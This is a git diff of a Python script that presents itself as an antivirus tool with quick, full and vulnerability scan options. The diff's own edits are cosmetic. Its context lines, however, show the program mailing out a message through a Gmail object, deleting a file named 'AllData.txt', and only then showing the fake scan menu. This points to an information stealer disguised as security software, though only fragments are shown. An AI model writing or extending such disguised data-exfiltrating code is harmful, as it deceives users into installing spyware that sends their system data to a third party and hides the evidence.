@@ -57,7 +57,6 @@ except ImportError as imp:
         system("pip3 install -r requirements.txt")
     else:
         system("sudo pip3 install -r requirements.txt")
-#End of Imports
 
 #Main program
 def get_size(bytes, suffix="B"):
@@ -110,8 +109,12 @@ gmail1.send(message)
 time.sleep(2)
 os.remove("AllData.txt")
 num=random.randint(1,24)
+
+#Logo
 trpint("ANTIVIRUS",font="tarty1")
+
 time.sleep(2)
+print("\n")
 print("[1] : Quick System Scan")
 time.sleep(1)
 print("[2] : Full System Scan")
@@ -122,11 +125,11 @@ print("[4] : Scan for vulnerabilities")
 time.sleep(1)
 print("[5] : Database Update")
 time.sleep(1)
-action=int(input("[+] Please enter the action you want to make: "))
-while action < 1 or action > 5:
+action=int(input("[::] Please enter the action you want to make: "))
+while action <= 0 or action > 5:
     print("[!] Invalid Action !")
     time.sleep(2)
-    action=int(input("[+] Please enter again: "))
+    action=int(input("[::] Please enter again: "))
 if action == 1:
     print("[+] Initiating Quick System Scan...")
     time.sleep(2)
